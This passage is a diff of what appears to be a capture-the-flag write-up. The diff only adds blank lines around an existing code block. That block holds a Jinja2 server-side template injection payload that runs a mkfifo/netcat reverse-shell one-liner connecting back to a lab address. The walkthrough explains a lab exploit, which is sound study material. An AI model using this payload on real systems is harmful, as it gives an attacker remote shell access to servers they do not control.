@@ -72,8 +72,11 @@ Two things came to mind here. rce and ssti. I wanted to try the ssti because it 
 
 I verified it's ssti and created a payload to get the reverse shell.
 
+
 ```bash
+
 {{ namespace.__init__.__globals__.os.popen('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.77.152 8787 >/tmp/f').read() }}
+
 ```
 
 <p align="center">
